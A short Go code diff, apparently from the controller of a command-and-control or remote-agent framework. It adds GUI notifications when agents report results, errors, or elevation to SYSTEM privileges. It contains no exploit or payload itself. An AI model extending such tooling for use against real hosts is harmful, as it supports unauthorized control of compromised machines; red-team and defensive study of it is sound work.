@@ -208,7 +208,17 @@ func (s *Server) handleTCPAgent(conn net.Conn) {
 				break
 			}
 			s.db.InsertResult(res.TaskID, agentID, res.Output, res.Error)
+			if res.IsAdmin {
+				s.db.UpdateAgentAdmin(agentID, true)
+				BroadcastGUI("AGENT_ADMIN", agentID, "elevated to SYSTEM")
+			}
 			go s.maybeRegisterMeshPeer(agentID, res.Output)
+			if res.Output != "" {
+				BroadcastGUI("TASK_RESULT", agentID, fmt.Sprintf("task #%d complete", res.TaskID))
+			}
+			if res.Error != "" {
+				BroadcastGUI("TASK_RESULT", agentID, fmt.Sprintf("task #%d error: %s", res.TaskID, res.Error))
+			}
 			ack, _ := json.Marshal(tcpMsg{Type: "ack"})
 			tcpWriteFrame(conn, ack) //nolint:errcheck
 
